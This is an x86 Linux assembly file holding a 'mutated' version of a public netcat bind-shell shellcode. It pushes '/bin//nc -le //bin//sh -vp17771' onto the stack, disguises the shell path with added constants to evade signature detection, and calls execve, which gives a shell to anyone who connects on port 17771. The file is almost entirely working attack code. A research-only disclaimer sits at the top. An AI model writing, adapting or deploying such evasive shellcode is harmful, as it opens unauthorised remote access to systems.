; Mutated netcat_bind shellcode. Original is http://shell-storm.org/shellcode/files/shellcode-804.php
; Filename: netcat_bind.nasm
; Author: Oleg Boytsev
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

global _start
section .text
 _start:
	xor eax, eax
	xor edx, edx
	push eax
	push 0x31373737  ;-vp17771
	push 0x3170762d
	mov esi, esp

	push eax

	mov edi, 0x57621e1e ;//sh abfuscation
	add edi, 0x11111111
	mov dword [esp-4], edi
	
	mov edi, 0x5d58511e ;/bin obfuscation;
	add edi, 0x11111111
	mov dword [esp-8], edi
	sub esp, 8

	push 0x2f656c2d  ;-le/

	mov edi, esp

	push eax
	push 0x636e2f2f  ;/bin//nc
	push 0x6e69622f
	mov ebx, esp

	push edx
	push esi
	push edi
	push ebx
	mov ecx, esp
	mov al,11
	int 0x80
